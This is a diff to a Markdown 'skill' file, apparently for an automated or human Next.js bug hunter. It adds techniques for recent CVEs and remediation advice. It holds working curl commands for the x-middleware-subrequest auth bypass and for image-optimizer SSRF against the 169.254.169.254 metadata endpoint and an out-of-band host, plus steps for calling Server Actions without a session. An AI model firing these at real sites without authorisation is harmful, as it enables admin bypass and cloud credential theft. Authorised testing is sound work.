@@ -1,8 +1,11 @@
 ---
 name: hunt-nextjs
 description: Hunt Next.js specific vulnerabilities — Server Actions arbitrary function execution, Middleware auth bypass via static asset paths, ISR cache poisoning, Image Optimization SSRF (/_next/image), RSC payload leakage, getServerSideProps injection, source map exposure, debug endpoint leakage. Use when target runs Next.js 13/14/15 or any React SSR framework.
-sources: "cve_database (CVE-2024-34351 / GHSA-fr5h-rqp8-mj6g), Next.js advisories"
+sources: "cve_database (CVE-2024-34351 / CVE-2025-29927 / CVE-2024-46982), Next.js advisories, zhero_web_security"
 report_count: 0
+cwe: [CWE-285, CWE-918, CWE-639, CWE-444, CWE-16]
+cvss_baseline: "Medium (6.1) RSC/source-map leakage → High (7.5-8.1) middleware auth bypass, image-optimizer SSRF, /_next/data IDOR → Critical (9.1) Server-Action unauth state change or SSRF-to-cloud-creds."
+related_skills: [hunt-spa-api, hunt-ssrf, hunt-idor, hunt-cache-poison, hunt-source-leak]
 ---
 
 # HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities
@@ -240,6 +243,40 @@ if m:
 | `__NEXT_DATA__` leaks | Server-side secrets in HTML | API keys / tokens |
 
 ---
+
+## New Techniques / CVEs (2024-2026)
+
+### CVE-2025-29927 — middleware auth bypass via `x-middleware-subrequest`
+The flagship Next.js bug of 2025: setting this header makes Next skip middleware entirely, bypassing auth/redirects implemented there. The value depends on version (middleware path, repeated segments):
+```bash
+curl -s -o /dev/null -w "%{http_code}\n" https://$T/admin \
+  -H 'x-middleware-subrequest: middleware'                         # 12.x style
+curl -si https://$T/admin -H 'x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'  # 14/15 nested style
+# 200 on a middleware-gated route = bypassed. Fixed 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3.
+```
+Because so many apps put the *only* authz in middleware, this is frequently a full admin bypass.
+
+### CVE-2024-46982 — SSR cache poisoning
+Craft requests that make Next cache a dynamic/private response as if static → serve another user's data (or injected content) from the cache. Probe pages that mix SSR with caching; confirm a second, clean client receives the poisoned response. Cross-ref `hunt-cache-poison`.
+
+### CVE-2024-34351 — image-optimizer SSRF (`/_next/image`)
+`?url=` with an attacker host that redirects to internal/metadata, or a self-host trick, makes the server fetch internal resources. Use a unique per-test OOB subdomain:
+```bash
+curl -s "https://$T/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"
+curl -s "https://$T/_next/image?url=https://OOB.oastify.com/x&w=64&q=75"   # confirm server-side fetch
+```
+
+### Server Actions abuse
+App-router Server Actions are POST endpoints keyed by a `Next-Action` id found in HTML/bundles. Call them directly with no session; if they mutate state/return data, authz was client-side only. Also test action-id confusion across routes and oversized/typed-arg injection.
+
+### `/_next/data` IDOR, RSC & source-map leakage
+`/_next/data/<buildId>/<page>.json?id=<victim>` often skips the UI's auth; `self.__next_f`/`__NEXT_DATA__` embed server props (sometimes secrets/tokens); `*.js.map` in prod reconstructs source + endpoints (hand to `hunt-source-leak`).
+
+## Remediation
+
+- Upgrade to patched Next.js (≥15.2.3 / 14.2.25 / 13.5.9 / 12.3.5); never rely on middleware as the sole authz — enforce auth in the route/handler/Server Action itself.
+- Restrict `images.remotePatterns`/`domains` and block internal/metadata targets for the optimizer; disable prod source maps; audit `__NEXT_DATA__`/RSC for leaked props.
+- Validate caching rules so private/SSR responses are never shared-cached; strip/ignore `x-middleware-subrequest` at the edge.
 
 ## Validation
 
